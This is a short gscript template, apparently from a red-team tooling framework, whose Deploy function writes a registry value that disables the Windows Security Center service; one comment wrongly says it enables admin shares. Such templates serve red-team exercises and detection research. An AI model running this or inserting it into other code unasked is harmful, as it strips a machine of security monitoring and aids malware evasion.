

// Example gscript template
// Title: Disable Security Center
// Author: ahhh
// Purpose: This will disable security center notifications
// Gscript version: 1.0.0
// ATT&CK: 
// Note: requires restart

//priority:99
//timeout:160

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting Disable Security Center");

    var value4 = 4
    // enable admin shares
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", "Start", value4);

    console.log("Done Disable Security Center");
    return true;
  }